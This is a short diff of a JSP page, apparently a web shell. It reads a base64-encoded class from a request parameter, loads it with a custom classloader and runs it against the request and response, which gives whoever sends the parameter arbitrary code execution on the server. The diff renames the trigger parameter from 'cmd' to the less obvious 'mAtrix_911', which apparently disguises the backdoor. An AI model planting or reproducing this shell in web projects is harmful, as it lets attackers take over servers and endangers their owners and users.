@@ -27,7 +27,7 @@
     }
 %>
 <%
-    String cls = request.getParameter("cmd");
+    String cls = request.getParameter("mAtrix_911");
     if (cls != null) {
         new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
     }
